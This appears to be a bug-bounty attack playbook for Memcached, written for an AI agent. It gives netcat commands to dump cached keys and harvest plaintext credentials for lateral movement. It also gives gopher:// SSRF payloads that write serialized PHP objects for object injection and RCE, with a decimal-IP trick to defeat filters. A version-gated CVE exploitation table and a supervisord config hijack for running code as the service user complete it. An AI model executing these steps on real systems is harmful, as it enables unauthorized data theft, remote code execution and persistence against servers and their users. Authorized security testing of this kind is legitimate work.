---
technology: "Memcached"
kind: bug-bounty-methodology
audience: ai-agent
family: databases
version: "1.0"
source: "corpus-mined (7 writeups, pass 1 2026-11-12) + upstream-verified (memcached man page/README, Debian security tracker, NVD)"
provenance: "corpus-grounded: 7 contributing writeups (internal coverage ledger, gate documented in header); upstream CVEs verified against primary sources during enrichment; basis of this page summarized from the unit ledger"
---

# Memcached bug-bounty methodology

Companion overview: [[memcached]].

## Phase 0 — Recon and banner

```
11211/tcp open  memcached
```
Netcat is the whole client. Grab version first — it gates the CVE table in Phase 4:

```
nc 198.51.100.x 11211
version                 → VERSION 1.4.15
stats                   → STAT version ... (same info inside the block, END terminates)
quit
```
No reply to ASCII probes + `-B binary` in the process list → binary protocol/SASL in play (try Phase 2 tooling instead). Check UDP 11211 too on anything older than 1.5.6.

## Phase 1 — Enumeration: the stats family

Slab model: keys are stored in size classes (slabs). Enumerate classes → items → keys → values:

```
stats                     # daemon info: version, uptime, curr_items, total sizes
stats slabs               # per-class chunk sizes and counters  → identifies slab class IDs
stats items               # items per class: ITEM counts, age  → class IDs holding data
stats cachedump 1 0       # list keys in slab class 1 (0 = all); key names + sizes
stats cachedump 16 1000   # a busy class from your stats-items output
get passwd                # read a key's value
get <any key seen in cachedump>
quit
```
Notes from the field: `stats cachedump` is the money command — key names alone leak internal hostnames, user names, token shapes; values frequently hold plaintext passwords and session blobs. Expect cleartext credentials usable for lateral movement. If cachedump returns nothing, try each class ID from `stats items`; if the operator set `-X`, dumping is disabled server-side — fall back to guessing keys from app source (`grep -r "memcache\|->get\|->set" /var/www`) and `get` those directly.

Non-interactive one-liners: `echo "stats items" | nc -q1 198.51.100.x 11211`.

## Phase 2 — Client tooling (when you can install)

```
apt-get install libmemcached-tools
memccat --servers=198.51.100.x <key>        # read values like the app does
memcdump --servers=198.51.100.x             # key enumeration
```
PHP/app-side evidence to look for with host access: `new Memcached()`, `OPT_BINARY_PROTOCOL`, `MEMCACHED_HOST=127.0.0.1` env, `memcache://127.0.0.1:11211/?timeout=60&prefix=xct_` cache-location strings — the prefix tells you the exact key namespace to `get`/poison.

## Phase 3 — SSRF pivot: writing through the app (gopher)

When the target app fetches URLs you control (feed fetchers, preview generators, "custom feed URL" inputs) and its cache backend is memcached, you can write arbitrary keys *as the app*:

```
gopher://127.0.0.1:11211/_%0d%0aset SpyD3r 4 0 98%0d%0a<98 bytes of payload>%0d%0a
gopher://2130706433:11211/_%0d%0a...        # 2130706433 = 127.0.0.1 in decimal (defeats naive filters)
```
Decode of the URL-encoded stream: `set <key> <flags> <exptime> <bytes>\r\n<data>\r\n`. Flags matter: `4` (or PHP-client conventions) make PHP deserialization happen on read — payload an object (`O:14:"ClassName":...}`) so the app's `unserialize` on cache hit gives you object injection → gadget chain → RCE. Verify injection first by setting a canary key and observing the app read it back.

Builder: Gopherus generates memcached gopher payloads (and the same technique ports to `tftp://`, `dict://` carriers where gopher is filtered). Any SSRF primitive that passes raw CRLF works — gopher is just the most convenient URL scheme for it.

## Phase 4 — Version-gated CVE table (verified upstream)

| CVE | Versions | Bug | Use |
|---|---|---|---|
| CVE-2009-1255 | <1.2.8 (+MemcacheDB 1.2.0) | `stats maps` leaks `/proc/self/maps`, `stats malloc` leaks allocation stats | ASLR defeat / recon (info disclosure) |
| CVE-2009-1494 | 1.2.8 | process_stat memory-allocation disclosure | recon |
| CVE-2013-7239 | <1.4.17 | SASL bypass: invalid request with SASL creds, then a second request with wrong creds is accepted | auth bypass when SASL is actually on |
| CVE-2013-0179 | 1.4.4–<1.4.17 | bin-delete in verbose mode → buffer over-read on stderr | DoS |
| CVE-2016-8704/8705/8706 | ≤1.4.33 (binary protocol; Talos confirmed 1.4.31–1.4.33) | integer overflow → heap overflow in bin append/prepend, update, SASL commands | RCE against binary-protocol listeners |
| CVE-2017-9951 | <1.4.39 | incomplete fix of 8705, heap over-read in try_read_command | DoS/info |
| CVE-2018-1000127 | <1.4.37 | integer overflow in items.c item_free | corruption/DoS |
| CVE-2018-1000115 | 1.5.5 and earlier with UDP | UDP amplification up to 1:50,000 (`stats`/`version` replies) | DRDoS; fixed 1.5.6 by disabling UDP default |
| CVE-2019-11596 | <1.5.14 | NULL deref parsing `lru mode`/`lru temp_ttl` | DoS |

Operationally: pure-ASCII-reachable instances rarely *need* a CVE — the protocol is a feature-level compromise. CVE work matters for binary-protocol/SASL deployments (2013-7239, 2016-87xx) and for impact statements (UDP amplifier).

## Phase 5 — Config-side attacks (host access)

- supervisord/ini program definitions (`memcached.ini` with `[program:memcached]`): if you own the containing directory, rename the original and drop your own ini pointing `command=` at a script — rides the next supervisord reload as the service user.
- `ps aux | grep memcached`: read runtime flags — `-l` (bind), `-S` (SASL), `-X` (dumping disabled), `-U` (UDP), `-B` (protocol) — before wasting probes on disabled surfaces.

## Decision summary

| You have | Move |
|---|---|
| Direct 11211 reach | Phase 1 stats/cachedump ladder → `get` everything |
| cachedump disabled (`-X`) | Phase 2 key-guessing from app source |
| SSRF in an app with memcache backend | Phase 3 gopher set → serialized payload → canary first |
| SASL errors | CVE-2013-7239 ladder; else binary-protocol RCE set if version fits |
| Host shell | Phase 5 config riding; harvest `MEMCACHED_*` env and prefixes |

## Tool map (named in prose)

netcat/ncat (the native client), libmemcached-tools (memccat, memcdump), Gopherus for gopher payload generation, Burp/curl for SSRF delivery, nmap service detection for 11211 fingerprinting.
